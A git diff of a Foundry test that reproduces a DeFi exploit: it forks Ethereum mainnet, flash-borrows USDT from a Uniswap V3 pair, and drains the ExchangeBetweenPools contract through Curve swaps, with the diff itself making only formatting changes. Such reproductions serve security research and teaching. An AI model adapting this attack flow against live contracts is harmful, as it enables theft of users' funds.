@@ -19,7 +19,7 @@ import "./interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IExchangeBetweenPools {
-    function doExchange(uint256 amounts) external returns(bool);
+    function doExchange(uint256 amounts) external returns (bool);
 }
 
 contract ContractTest is Test {
@@ -28,12 +28,12 @@ contract ContractTest is Test {
     IExchangeBetweenPools ExchangeBetweenPools = IExchangeBetweenPools(0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D);
     IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
     Uni_Pair_V3 Pair = Uni_Pair_V3(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
-    uint256 victimAmount = 119023523157;
+    uint256 victimAmount = 119_023_523_157;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17376906);
+        cheats.createSelectFork("mainnet", 17_376_906);
         cheats.label(address(USDC), "USDC");
         cheats.label(address(USDT), "USDT");
         cheats.label(address(ExchangeBetweenPools), "ExchangeBetweenPools");
@@ -41,7 +41,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        USDC.approve(address(curveYSwap), type(uint).max);
+        USDC.approve(address(curveYSwap), type(uint256).max);
         address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(curveYSwap), type(uint256).max));
         Pair.flash(address(this), 0, 120_000 * 1e6, new bytes(1));
 
@@ -56,6 +56,4 @@ contract ContractTest is Test {
         curveYSwap.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);
         USDC.transfer(address(Pair), 120_000 * 1e6 + uint256(amount1));
     }
-
 }
-
